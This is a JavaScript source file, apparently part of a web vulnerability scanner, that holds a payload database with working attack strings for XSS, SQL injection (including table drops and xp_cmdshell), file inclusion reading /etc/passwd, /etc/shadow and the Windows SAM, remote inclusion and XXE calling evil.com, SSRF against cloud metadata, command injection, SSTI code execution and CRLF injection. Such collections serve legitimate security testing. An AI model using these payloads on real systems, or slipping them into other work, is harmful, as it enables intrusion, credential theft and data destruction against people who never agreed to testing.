
export class VulnerabilityDatabase {
  constructor() {
    this.vulnerabilities = this.loadVulnerabilityDatabase();
  }

  loadVulnerabilityDatabase() {
    return {
      xss: [
        // Reflected XSS
        '<script>alert("XSS")</script>',
        '<img src=x onerror=alert("XSS")>',
        '<svg onload=alert("XSS")>',
        '<iframe src="javascript:alert(\'XSS\')">',
        '<body onload=alert("XSS")>',
        '<input onfocus=alert("XSS") autofocus>',
        '<select onfocus=alert("XSS") autofocus>',
        '<textarea onfocus=alert("XSS") autofocus>',
        '<keygen onfocus=alert("XSS") autofocus>',
        '<video><source onerror="alert(\'XSS\')">',
        '<audio src=x onerror=alert("XSS")>',
        '<details open ontoggle=alert("XSS")>',
        '<marquee onstart=alert("XSS")>',
        // DOM XSS
        'javascript:alert("XSS")',
        'data:text/html,<script>alert("XSS")</script>',
        // Filter bypass
        '<ScRiPt>alert("XSS")</ScRiPt>',
        '<script>eval(String.fromCharCode(97,108,101,114,116,40,34,88,83,83,34,41))</script>',
        '<script>alert(/XSS/)</script>',
        '<script>alert`XSS`</script>',
        // Event handlers
        '<img src=x onerror="alert(\'XSS\')" />',
        '<input type="image" src=x onerror="alert(\'XSS\')" />',
        '<isindex type=image src=1 onerror=alert("XSS")>',
        // CSS injection
        '<style>@import"javascript:alert(\'XSS\')";</style>',
        '<link rel=stylesheet href="javascript:alert(\'XSS\')">',
        // Encoding bypass
        '%3Cscript%3Ealert(%22XSS%22)%3C/script%3E',
        '&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;',
        // WAF bypass
        '<svg/onload=alert("XSS")>',
        '<img src=1 onerror=alert("XSS")>',
        '<iframe src=javascript:alert("XSS")>',
        // AngularJS
        '{{constructor.constructor("alert(\'XSS\')")()}}',
        '{{7*7}}{{this}}',
        // Vue.js
        '{{constructor.constructor("alert(\'XSS\')")()}}',
        // React
        'javascript:alert("XSS")',
        // Template injection
        '${alert("XSS")}',
        '#{alert("XSS")}'
      ],
      
      sqlinjection: [
        // Basic SQL injection
        "' OR '1'='1",
        "' OR 1=1--",
        "' OR 1=1#",
        "' OR 1=1/*",
        "admin'--",
        "admin'#",
        "admin'/*",
        "' or 1=1#",
        "' or 1=1--",
        "' or 1=1/*",
        "') or '1'='1--",
        "') or ('1'='1--",
        // Union-based
        "' UNION SELECT 1,2,3--",
        "' UNION SELECT NULL,NULL,NULL--",
        "' UNION ALL SELECT 1,2,3--",
        // Time-based blind
        "'; WAITFOR DELAY '00:00:05'--",
        "'; SELECT SLEEP(5)--",
        "'; pg_sleep(5)--",
        // Boolean-based blind
        "' AND (SELECT SUBSTRING(@@version,1,1))='5'--",
        "' AND 1=1--",
        "' AND 1=2--",
        // Error-based
        "' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()), 0x7e))--",
        "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
        // NoSQL injection
        "{'$ne': null}",
        "{'$gt': ''}",
        "'; return db.version(); var dummy='",
        // Second-order SQL injection
        "admin'; DROP TABLE users; --",
        // Advanced payloads
        "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
        "' OR (SELECT * FROM (SELECT(SLEEP(5)))a)--",
        // Database-specific
        "'; EXEC xp_cmdshell('ping 127.0.0.1')--", // MSSQL
        "' AND (SELECT LOAD_FILE('/etc/passwd'))--", // MySQL
        "'; SELECT pg_ls_dir('/')--", // PostgreSQL
        // Stacked queries
        "'; INSERT INTO users VALUES ('hacker','password')--",
        "'; UPDATE users SET password='hacked' WHERE username='admin'--"
      ],
      
      lfi: [
        // Basic LFI
        '../../../../../../../etc/passwd',
        '../../../../../../../etc/shadow',
        '../../../../../../../etc/hosts',
        '../../../../../../../etc/hostname',
        '../../../../../../../etc/issue',
        '../../../../../../../proc/version',
        '../../../../../../../proc/self/environ',
        '../../../../../../../proc/self/cmdline',
        '../../../../../../../proc/self/stat',
        '../../../../../../../proc/self/status',
        // Windows LFI
        '../../../../../../../windows/system32/drivers/etc/hosts',
        '../../../../../../../windows/system.ini',
        '../../../../../../../windows/win.ini',
        '../../../../../../../boot.ini',
        'C:\\windows\\system32\\drivers\\etc\\hosts',
        'C:\\windows\\system32\\config\\sam',
        // Null byte injection
        '../../../../../../../etc/passwd%00',
        '../../../../../../../etc/passwd%00.txt',
        // URL encoding
        '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
        // Double encoding
        '%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd',
        // Filter bypass
        '....//....//....//....//....//....//....//etc/passwd',
        '..\\..\\..\\..\\..\\..\\..\\etc\\passwd',
        // Log poisoning
        '/var/log/apache2/access.log',
        '/var/log/apache2/error.log',
        '/var/log/nginx/access.log',
        '/var/log/nginx/error.log',
        '/var/log/auth.log',
        '/var/log/messages',
        '/var/log/syslog',
        // Wrapper usage
        'php://filter/read=convert.base64-encode/resource=index.php',
        'php://input',
        'data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==',
        'expect://id',
        'zip://shell.zip#shell.php'
      ],
      
      rfi: [
        // Basic RFI
        'http://evil.com/shell.txt',
        'https://evil.com/shell.txt',
        'ftp://evil.com/shell.txt',
        // Null byte
        'http://evil.com/shell.txt%00',
        // Question mark bypass
        'http://evil.com/shell.txt?',
        // Hash bypass
        'http://evil.com/shell.txt#',
        // Data wrapper
        'data://text/plain,<?php phpinfo(); ?>',
        'data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==',
        // HTTP wrapper
        'http://127.0.0.1/shell.php',
        'https://127.0.0.1/shell.php'
      ],
      
      xxe: [
        // Basic XXE
        '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>',
        '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
        // Blind XXE
        '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY % xxe SYSTEM "http://evil.com/evil.dtd">%xxe;]><foo>&blind;</foo>',
        // Parameter entity
        '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % ext SYSTEM "http://evil.com/evil.dtd">%ext;]><root></root>',
        // Error-based XXE
        '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % ext SYSTEM "file:///etc/passwd"><!ENTITY % eval "<!ENTITY &#x25; error SYSTEM \'file:///nonexistent/%ext;\'>">%eval;%error;]><root></root>'
      ],
      
      ssrf: [
        // Internal network
        'http://127.0.0.1',
        'http://localhost',
        'http://0.0.0.0',
        'http://169.254.169.254', // AWS metadata
        'http://metadata.google.internal', // GCP metadata
        'http://[::1]',
        'http://192.168.1.1',
        'http://10.0.0.1',
        'http://172.16.0.1',
        // Port scanning
        'http://127.0.0.1:22',
        'http://127.0.0.1:3306',
        'http://127.0.0.1:5432',
        'http://127.0.0.1:6379',
        'http://127.0.0.1:27017',
        // Protocol handlers
        'file:///etc/passwd',
        'gopher://127.0.0.1:6379/_INFO',
        'dict://127.0.0.1:11211/stats',
        'ftp://127.0.0.1',
        'ldap://127.0.0.1',
        // Bypass filters
        'http://127.1',
        'http://0x7f000001',
        'http://017700000001',
        'http://0177.0.0.1',
        'http://127.0.0.1.xip.io',
        'http://subdomain.127.0.0.1.nip.io'
      ],
      
      cmdi: [
        // Basic command injection
        '; ls',
        '| ls',
        '& ls',
        '&& ls',
        '|| ls',
        '`ls`',
        '$(ls)',
        // Time-based
        '; sleep 5',
        '| sleep 5',
        '& sleep 5',
        '&& sleep 5',
        '|| sleep 5',
        '`sleep 5`',
        '$(sleep 5)',
        // Blind command injection
        '; ping -c 4 127.0.0.1',
        '| ping -c 4 127.0.0.1',
        '& ping -c 4 127.0.0.1',
        '&& ping -c 4 127.0.0.1',
        '|| ping -c 4 127.0.0.1',
        // Data exfiltration
        '; cat /etc/passwd',
        '| cat /etc/passwd',
        '& cat /etc/passwd',
        '&& cat /etc/passwd',
        '|| cat /etc/passwd',
        '`cat /etc/passwd`',
        '$(cat /etc/passwd)',
        // Windows
        '; dir',
        '| dir',
        '& dir',
        '&& dir',
        '|| dir',
        // PowerShell
        '; powershell -c "Get-Process"',
        '| powershell -c "Get-Process"',
        '& powershell -c "Get-Process"'
      ],
      
      csrf: [
        // GET-based CSRF
        '<img src="http://vulnerable.com/transfer?amount=1000&to=attacker">',
        '<script>fetch("http://vulnerable.com/delete-account")</script>',
        // POST-based CSRF
        '<form action="http://vulnerable.com/transfer" method="POST"><input name="amount" value="1000"><input name="to" value="attacker"><input type="submit" value="Click me"></form>',
        // JSON CSRF
        '<script>fetch("http://vulnerable.com/api/user", {method: "POST", headers: {"Content-Type": "application/json"}, body: JSON.stringify({role: "admin"})})</script>',
        // PUT/DELETE CSRF
        '<script>fetch("http://vulnerable.com/api/user/1", {method: "DELETE"})</script>'
      ],
      
      idor: [
        // Numeric IDOR
        '/user/1',
        '/user/2',
        '/user/999',
        '/document/1',
        '/document/2',
        '/api/user/1',
        '/api/user/2',
        // GUID IDOR
        '/user/00000000-0000-0000-0000-000000000001',
        '/user/11111111-1111-1111-1111-111111111111',
        // Encoded IDOR
        '/user/MQ==', // base64 of "1"
        '/user/Mg==', // base64 of "2"
        // Hash IDOR (common patterns)
        '/user/5d41402abc4b2a76b9719d911017c592', // md5 of "hello"
        '/user/356a192b7913b04c54574d18c28d46e6395428ab' // sha1 of "1"
      ],
      
      oauth: [
        // State parameter missing/weak
        'response_type=code&client_id=CLIENT_ID&redirect_uri=http://evil.com',
        // Redirect URI manipulation
        'redirect_uri=http://evil.com',
        'redirect_uri=http://legitimate.com@evil.com',
        'redirect_uri=http://legitimate.com.evil.com',
        'redirect_uri=http://legitimate.com/callback/../../../evil',
        // Client ID manipulation
        'client_id=evil_client',
        // Response type confusion
        'response_type=token',
        'response_type=code+token'
      ],
      
      jwt: [
        // None algorithm
        'eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.',
        // Weak secret
        'secret',
        'password',
        '123456',
        'admin',
        'jwt',
        'hs256',
        // Key confusion (RS256 to HS256)
        // Algorithm confusion
        'HS256',
        'HS384',
        'HS512',
        'RS256',
        'none'
      ],
      
      websocket: [
        // Message injection
        '{"type":"message","data":"<script>alert(\'XSS\')</script>"}',
        '{"type":"admin","action":"delete_user","user_id":1}',
        // CSRF over WebSocket
        'ws://vulnerable.com/websocket',
        // Binary message injection
        '\x00\x01\x02\x03'
      ],
      
      graphql: [
        // Introspection
        'query IntrospectionQuery { __schema { queryType { name } } }',
        'query { __type(name: "User") { fields { name type { name } } } }',
        // Query depth attack
        'query { user { posts { comments { author { posts { comments { author { name } } } } } } } }',
        // Field duplication
        'query { user { id id id id id } }',
        // Alias overloading
        'query { alias1: user(id: 1) { name } alias2: user(id: 2) { name } }'
      ],
      
      nosql: [
        // MongoDB injection
        '{"$ne": null}',
        '{"$gt": ""}',
        '{"$where": "this.password.match(/.*/)"}',
        '{"$regex": ".*"}',
        '{"$exists": true}',
        // JavaScript injection
        '\"; return db.users.find(); var dummy=\"',
        '\' || \'1\'==\'1',
        // Blind NoSQL injection
        '{"username": {"$ne": null}, "password": {"$ne": null}}',
        '{"$where": "sleep(5000)"}'
      ],
      
      ldap: [
        // LDAP injection
        '*',
        '*)(uid=*',
        '*)(|(uid=*',
        '*)(&(uid=*',
        '*))%00',
        '*(|(password=*))',
        '*(|(objectClass=*))'
      ],
      
      xpath: [
        // XPath injection
        '\' or \'1\'=\'1',
        '\' or 1=1 or \'\'=\'',
        '\' or //user[username/text()=\'\' or \'1\'=\'1\' and password/text()=\'\' or \'1\'=\'1\']',
        'string(//user[position()=1]/child::node()[position()=1])',
        'count(//user/child::node())',
        'string-length(//user[position()=1]/child::node()[position()=1])'
      ],
      
      ssti: [
        // Jinja2/Flask
        '{{7*7}}',
        '{{config}}',
        '{{self}}',
        '{{lipsum.__globals__}}',
        '{{url_for.__globals__[\'sys\'].modules}}',
        '{{request.application.__globals__.__builtins__.__import__(\'os\').popen(\'id\').read()}}',
        // Twig
        '{{7*7}}',
        '{{_self}}',
        '{{dump(app)}}',
        // Smarty
        '{$smarty.version}',
        '{php}echo `id`;{/php}',
        // Freemarker
        '${7*7}',
        '${product.getClass()}',
        '<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("id") }',
        // Velocity
        '#set($ex=$e.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("id"))',
        '$ex.waitFor()',
        '#set($out=$ex.getInputStream())'
      ],
      
      crlf: [
        // Basic CRLF injection
        '%0d%0aSet-Cookie: admin=true',
        '%0a%0dSet-Cookie: admin=true',
        '\\r\\nSet-Cookie: admin=true',
        '\\n\\rSet-Cookie: admin=true',
        // HTTP response splitting
        '%0d%0aContent-Length: 0%0d%0a%0d%0aHTTP/1.1 200 OK%0d%0aContent-Type: text/html%0d%0aContent-Length: 25%0d%0a%0d%0a<script>alert(1)</script>',
        // Log injection
        '%0d%0a[ADMIN] User login successful'
      ]
    };
  }

  getPayloads(type) {
    return this.vulnerabilities[type] || [];
  }

  getAllPayloads() {
    return this.vulnerabilities;
  }

  getRandomPayload(type) {
    const payloads = this.getPayloads(type);
    return payloads[Math.floor(Math.random() * payloads.length)];
  }
}
